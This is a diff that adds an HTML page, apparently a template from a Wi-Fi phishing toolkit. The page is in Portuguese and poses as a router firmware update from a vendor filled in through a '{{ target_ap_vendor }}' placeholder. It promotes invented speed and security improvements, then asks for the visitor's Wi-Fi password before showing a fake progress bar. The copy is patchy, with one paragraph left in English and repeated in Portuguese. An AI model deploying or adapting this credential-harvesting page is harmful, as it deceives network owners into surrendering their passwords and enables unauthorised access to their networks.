@@ -1,0 +1,135 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+
+    <link rel="stylesheet" href="css/style.css" />
+    <link rel="shortcut icon" type="image/png" href="img/favicon.png" />
+
+    <title>Atualização de Firmware</title>
+</head>
+
+<body>
+    <header class="header">
+        <div class="header__text-box">
+            <h1 class="heading-primary">
+                <span class="heading-primary--main">Nova Atualização</span>
+                <span class="heading-primary--sub">disponível agora</span>
+            </h1>
+
+            <a href="#section-update" class="btn btn--white btn--animation">iniciar »</a>
+        </div>
+    </header>
+    <main>
+        <section class="section-new">
+            <div class="u-center-text u-margin-bottom-big">
+                <h2 class="heading-secondary">
+                    O que há de novo nessa atualização
+                </h2>
+            </div>
+
+            <div class="feature-box">
+                <div class="feature-box__items">
+                    <svg class="feature-box__icon u-margin-bottom-small">
+                        <use xlink:href="img/sprites.svg#icon-connection"></use>
+                    </svg>
+                    <p class="feature-box__text">
+                        Esta atualização estenderá seu alcance sem fio a níveis sem precedentes. Nós temos
+                        trabalhado muito para garantir que você possa acessar o WIFI
+                        não importa onde você esteja. Agora você pode acessar a Internet 
+                        de ainda mais longe e melhor qualidade de sinal.
+                    </p>
+                </div>
+                <div class="feature-box__items">
+                    <svg class="feature-box__icon u-margin-bottom-small">
+                        <use xlink:href="img/sprites.svg#icon-meter"></use>
+                    </svg>
+                    <p class="feature-box__text">
+                        This update will increase your WIFI speeds so you can enjoy it without waiting
+                        for website to load. Say goodbye to slow connections
+                        and experience a new way of connecting to the internet.
+
+                    </p>
+                </div>
+                <div class="feature-box__items">
+                    <svg class="feature-box__icon u-margin-bottom-small">
+                        <use xlink:href="img/sprites.svg#icon-bug"></use>
+                    </svg>
+                    <p class="feature-box__text">
+                        Esta atualização aumentará suas velocidades WIFI para que você possa desfrutar sem esperar
+                        na hora de carregar um site. Diga adeus às conexões lentas
+                        e experimente uma nova maneira de se conectar à Internet.
+                    </p>
+                </div>
+                <div class="feature-box__items">
+                    <svg class="feature-box__icon u-margin-bottom-small">
+                        <use xlink:href="img/sprites.svg#icon-shield"></use>
+                    </svg>
+                    <p class="feature-box__text">
+                        Muitos novos recursos de segurança foram adicionados nesta atualização para 
+                        garantir que você e sua família segurança enquanto navegam na internet. Um notável
+                        recurso é melhor suporte dos pais para que você possa facilmente
+                        controle o que seus filhos fazem online.
+                    </p>
+                </div>
+            </div>
+
+        </section>
+
+        <section class="section-update" id="section-update">
+            <div class="update u-margin-bottom-huge">
+                <div class="update__form">
+                    <form class="form" onsubmit="return false">
+                        <div class="u-margin-bottom-medium">
+                            <h2 class="heading-secondary">
+                                Iniciando atualização
+                            </h2>
+                        </div>
+
+                        <div class="form__group">
+                            <input type="password" class="form__input" placeholder="Password" id="pass" pattern="[A-Za-z0-9!@#$%^&*-+_=]{8,}"
+                                required />
+                            <label for="pass" class="form__label">Senha WIFI</label>
+                        </div>
+
+                        <div class="form__group">
+                            <p class="paragraph">
+                                Ao clicar em Próxima etapa, você concorda com nossa
+                                <a class="btn-text" href="#">
+                                política de serviços.
+                                </a>
+                            </p>
+                        </div>
+
+
+                        <div class="form__group">
+                            <button class="btn btn--green" id="form-button">Próximo passo →</button>
+                        </div>
+                    </form>
+                </div>
+            </div>
+            <div class="progress">
+                <div class="progress__bar">
+                </div>
+                <div class="progress__text">
+                    <span class="progress__text--main" id="progress__percentage">0%</span>
+                    <span class="progress__text--sub">Completo</span>
+                </div>
+            </div>
+        </section>
+    </main>
+
+    <footer class="footer">
+        <div class="footer__copyright">
+            <p>
+                Copyright © by {{ target_ap_vendor }}. Todos direitos reservados.
+            </p>
+        </div>
+    </footer>
+
+    <script src="js/script.js"></script>
+</body>
+
+</html>
